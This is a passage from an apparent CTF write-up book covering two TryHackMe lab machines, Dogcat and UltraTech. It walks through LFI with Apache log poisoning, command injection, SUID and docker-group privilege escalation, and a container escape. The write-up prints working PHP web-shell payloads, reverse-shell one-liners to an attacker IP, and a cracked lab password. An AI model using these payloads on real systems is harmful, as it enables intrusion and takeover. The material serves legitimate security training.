NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=    &lt;/div&gt;
</code></pre>
<p>This confirms <strong>LFI + traversal</strong> and gives us OS context. At this point, two RCE paths are typical:</p>
<ol>
<li><code>php://input</code> inclusion (if enabled), or</li>
<li><strong>Apache log poisoning</strong> ‚Üí include the log. We chose log poisoning (more deterministic).</li>
</ol>
<h3 id="rce-via-apache-log-poisoning"><a class="header" href="#rce-via-apache-log-poisoning">RCE via Apache log poisoning</a></h3>
<ol>
<li><strong>Poison log</strong> with a PHP payload in <strong>User-Agent</strong>:</li>
</ol>
<pre><code class="language-bash">curl -A '"&lt;?php system($_GET[x]); ?&gt;' 'http://10.201.51.13/?view=dog'
</code></pre>
<ol start="2">
<li><strong>Trigger inclusion of access log</strong> and execute a reverse shell:</li>
</ol>
<pre><code class="language-bash"># LFI include of access.log, no extension, run /bin/bash reverse shell
curl 'http://10.201.51.13/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;x=bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E23%2E99%2E212%2F4444%20%3C%261%27'
</code></pre>
<pre><code class="language-bash"># Listener
nc -lvnp 4444
Connection from 10.201.51.13:34398
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@6703c0ed25a3:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>We land a <code>www-data</code> shell. Commentary: <code>php://input</code> could have been plan B if <code>allow_url_include</code>/stream wrappers were friendlier; logs were already confirmed readable, so poisoning was lower friction.</p>
<hr />
<h2 id="post-exploitation-web-container"><a class="header" href="#post-exploitation-web-container">Post-Exploitation (Web Container)</a></h2>
<h3 id="proofs--flags"><a class="header" href="#proofs--flags">Proofs &amp; flags</a></h3>
<pre><code class="language-bash"># Web root
cat flag.php
&lt;?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?&gt;

cat ../flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
</code></pre>
<p>Thoughts: placing the first two flags in/near web root nudges the player to escalate further.</p>
<h3 id="privilege-escalation-container--root"><a class="header" href="#privilege-escalation-container--root">Privilege escalation (container ‚Üí root)</a></h3>
<p>SUID check:</p>
<pre><code class="language-bash">find / -perm -4000 -ls 2&gt;/dev/null
   402184     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /bin/mount
   402201     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /bin/su
   402208     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /bin/umount
   403077     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   403169     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   403179     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   403080     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   539630     44 -rwsr-sr-x   1 root     root        43680 Feb 28  2019 /usr/bin/env
   403126     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   539824    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">/usr/bin/env /bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

cat /root/flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
</code></pre>
<p>Comment: SUID <code>env</code> is a classic misconfig enabling <code>bash -p</code> (preserve privileges). Always strip SUID on generic binaries.</p>
<hr />
<h2 id="lateral--escape-to-host-root"><a class="header" href="#lateral--escape-to-host-root">Lateral / Escape to Host Root</a></h2>
<pre><code class="language-bash">ls -a /
.dockerenv
</code></pre>
<p>Enumeration hinted at <strong>Dockerized environment</strong> (<code>/.dockerenv</code>). In <code>/opt/backups</code>:</p>
<pre><code class="language-bash">ls -l /opt/backups
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
</code></pre>
<p><strong>Writable</strong> <code>backup.sh</code> lets us inject a one-liner reverse shell to hijack whatever executes it (likely cron/systemd on host bind-mount):</p>
<pre><code class="language-bash">echo -e "bash -i &gt;&amp; /dev/tcp/10.23.99.212/9999 0&gt;&amp;1" &gt;&gt; /opt/backups/backup.sh

# Host listener
nc -lnvp 9999

# Shell pops as root on host
root@dogcat:~# ls
container
flag4.txt
cat flag4.txt
# THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
</code></pre>
<p>Commentary: This is a <strong>build/backup pipeline abuse</strong>‚Äîexecutable under higher privileges outside the container boundary. Integrity of scripts under <code>/opt/backups</code> must be enforced with permissions and signing.</p>
<div style="break-before: page; page-break-before: always;"></div><p>that's interesting
we might get a reverse shell</p>
<p>this is not working we might need a better shell</p>
<pre><code class="language-bash">curl -G 'http://10.10.211.245:8081/ping' \
  --data-urlencode $'ip=127.0.0.1`python - &lt;&lt;PY\nimport socket,os,pty\ns=socket.socket()\ns.connect(("10.23.99.212",4444))\nfor fd in (0,1,2): os.dup2(s.fileno(),fd)\npty.spawn("/bin/bash")\nPY`'
</code></pre>
<pre><code class="language-bash">nc -lvnp 4444
Connection from 10.10.211.245:39338
www@ip-10-10-211-245:~/api$ id
id
uid=1002(www) gid=1002(www) groups=1002(www)
</code></pre>
<pre><code class="language-bash">cat utech.db.sqlite 
zzÔøΩÔøΩetableusersusersCREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
ÔøΩÔøΩÔøΩ(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84
</code></pre>
<p>Looks like we found some credentials:
<code>r00t:f357a0c52799563c7c7b76c1e7543a32</code>
<code>admin0d0ea5111e3c1def594c1684e3b9be84</code></p>
<h1 id="ultratech-ctf"><a class="header" href="#ultratech-ctf">UltraTech CTF</a></h1>
<h2 id="recon-2"><a class="header" href="#recon-2">Recon</a></h2>
<h3 id="nmap-1"><a class="header" href="#nmap-1">Nmap</a></h3>
<pre><code class="language-bash">nmap -sV -Pn -oN nmap.txt 10.10.211.245 -p21,22,8081,31331 -sC
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</code></pre>
<hr />
<h2 id="web-enumeration"><a class="header" href="#web-enumeration">Web Enumeration</a></h2>
<h3 id="ffuf"><a class="header" href="#ffuf">ffuf</a></h3>
<pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.136.152:8081/FUZZ
auth                    [Status: 200, Size: 39, Words: 8, Lines: 1, Duration: 202ms]
ping                    [Status: 500, Size: 1094, Words: 52, Lines: 11, Duration: 123ms]
</code></pre>
<h3 id="endpoint-behavior"><a class="header" href="#endpoint-behavior">Endpoint behavior</a></h3>
<p>Initial request:</p>
<pre><code class="language-bash">curl 'http://10.10.216.51:8081/ping'
</code></pre>
<p>Response leaks stack trace:</p>
<pre><code>TypeError: Cannot read property 'replace' of undefined
  at app.get (/home/www/api/index.js:45:29)
</code></pre>
<p>Inference: Express route does <code>req.query.&lt;param&gt;.replace(...)</code> then shells out to <code>ping</code>.</p>
<h3 id="param-discovery"><a class="header" href="#param-discovery">Param discovery</a></h3>
<pre><code class="language-bash">curl 'http://10.10.216.51:8081/ping?ip=localhost'                       
PING localhost(localhost6.localdomain6 (::1)) 56 data bytes
64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.031 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
</code></pre>
<h3 id="filter-characteristics"><a class="header" href="#filter-characteristics">Filter characteristics</a></h3>
<ul>
<li>Testing basic commands injection technique such as semicolon <code>;</code> or pipe <code>|</code>, found out they are stripped</li>
<li><strong>Backticks</strong> and <strong>newlines</strong> survive</li>
</ul>
<h3 id="proof-of-rce"><a class="header" href="#proof-of-rce">Proof of RCE</a></h3>
<pre><code class="language-bash">curl -G 'http://10.10.211.245:8081/pingip=127.0.0.1%0Aid'                                                
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.072 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.072/0.072/0.072/0.000 ms
uid=1002(www) gid=1002(www) groups=1002(www)
</code></pre>
<hr />
<h2 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h2>
<pre><code class="language-bash">curl 'http://10.10.211.245:8081/ping?ip=127.0.0.1%0Abash%20-c%20%22exec%20bash%20-i%20%3E/dev/tcp/10.23.99.212/4444%202%3E%261%20%3C%261%22'
</code></pre>
<pre><code class="language-bash">nc -lvnp 4444
Connection from 10.10.211.245:54508
id
ls
</code></pre>
<p>This command worked but the shell was unstabble. A better reliability came from Python PTY.</p>
<pre><code class="language-bash">curl -G 'http://10.10.211.245:8081/ping'   --data-urlencode $'ip=127.0.0.1`python - &lt;&lt;PY
import socket,os,pty
s=socket.socket()
s.connect(("10.23.99.212",4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn("/bin/bash")
PY
echo 127.0.0.1`'
</code></pre>
<pre><code class="language-bash">nc -lvnp 4444
Connection from 10.10.211.245:39338
www@ip-10-10-211-245:~/api$ id
id
uid=1002(www) gid=1002(www) groups=1002(www)
</code></pre>
<hr />
<h2 id="linux-enumeration"><a class="header" href="#linux-enumeration">Linux Enumeration</a></h2>
<h3 id="interesting-file-sqlite-db"><a class="header" href="#interesting-file-sqlite-db">Interesting file: SQLite DB</a></h3>
<pre><code class="language-bash">ls
# utech.db.sqlite

strings utech.db.sqlite
# CREATE TABLE users (login Varchar, password Varchar, type Int)
# r00t  f357a0c52799563c7c7b76c1e7543a32
# admin 0d0ea5111e3c1def594c1684e3b9be84
</code></pre>
<h3 id="crack-hashes-raw-md5"><a class="header" href="#crack-hashes-raw-md5">Crack hashes (raw MD5)</a></h3>
<p>![[crackstation.png]]
Using Crack station, we cracked <code>r00t</code> password</p>
<ul>
<li><code>f357a0c52799563c7c7b76c1e7543a32</code> ‚Üí <strong>n100906</strong></li>
</ul>
<p><code>admin</code> password was also cracked.</p>
<h3 id="valid-local-users"><a class="header" href="#valid-local-users">Valid local users</a></h3>
<pre><code class="language-bash">grep /bin/bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
r00t:x:1001:1001::/home/r00t:/bin/bash
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
</code></pre>
<h3 id="switch-user"><a class="header" href="#switch-user">Switch user</a></h3>
<p>Use <code>r00t : n100906</code> to move to an owned context:</p>
<pre><code class="language-bash"># via shell on box (or SSH if permitted)
su - r00t
id
# uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
</code></pre>
<hr />
<h2 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h2>
<pre><code class="language-bash">r00t@ip-10-10-211-245:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
</code></pre>
<p>Being in <code>docker</code> is root-equivalent. No need to pull images; host already has <code>bash:latest</code>.</p>
<h3 id="method-bind-mount--and-chroot"><a class="header" href="#method-bind-mount--and-chroot">Method: bind-mount <code>/</code> and chroot</a></h3>
<pre><code class="language-bash">docker image ls -a
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB

docker run --rm -it -v /:/mnt --privileged bash:latest bash -lc 'chroot /mnt /bin/bash'

root@6896534b995b:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
</code></pre>
<hr />
<h2 id="lessons-learned"><a class="header" href="#lessons-learned">Lessons Learned</a></h2>
<ul>
<li>Filters that delete a single metacharacter (<code>;</code>) are security theater; <strong>command substitution</strong> and <strong>newlines</strong> remain lethal.</li>
<li>Any user in <code>docker</code> is effectively <strong>root</strong>; treat group assignment as a privileged operation.</li>
<li>Hashes in app artifacts rapidly become credentials if they‚Äôre <strong>unsalted MD5</strong>.</li>
<li>Deny detailed error pages to unauthenticated clients‚Äîstack traces map the code path to the bug.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="references"><a class="header" href="#references">References</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tools"><a class="header" href="#tools">Tools</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="command-cheatsheet"><a class="header" href="#command-cheatsheet">Command Cheatsheet</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bibliography"><a class="header" href="#bibliography">Bibliography</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>


    </div>
    </body>
</html>
